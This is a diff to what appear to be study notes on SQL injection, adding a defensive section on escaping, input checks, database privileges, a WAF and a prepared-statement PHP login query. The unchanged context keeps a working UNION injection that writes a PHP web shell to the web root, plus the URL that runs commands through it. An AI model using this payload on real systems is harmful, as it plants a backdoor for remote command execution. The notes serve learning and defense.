@@ -73,4 +73,34 @@ File syntax:
   cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
     http://SERVER_IP:PORT/shell.php?0=id
 
+
+Defensive:
+  ' to \'      " to \"
+    https://www.php.net/manual/en/mysqli.real-escape-string.php
+    https://www.php.net/manual/en/function.pg-escape-string.php
+
+  regular expression
+    test and number only
+
+  set priv in db
+
+  WAF
+
+  Lock query logic:
+    // 1. 从前端 POST 请求中获取用户输入的用户名和密码
+    $username = $_POST['username'];  
+    $password = $_POST['password'];  
+    
+    // 2. 构造 SQL 模板。注意：这里没有直接拼接变量，而是用了两个问号 '?' 作为占位符
+    $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;  
+    
+    // 3. 将 SQL 模板发送给 MySQL 数据库进行“预编译”
+    $stmt = mysqli_prepare($conn, $query);  
+    
+    // 4. 将用户输入的真实变量绑定到对应的 '?' 占位符上（'ss' 表示这两个变量都是 string 字符串类型）
+    mysqli_stmt_bind_param($stmt, 'ss', $username, $password);  
+    
+    // 5. 正式执行这条已经安全的 SQL 语句
+    mysqli_stmt_execute($stmt);
+
   
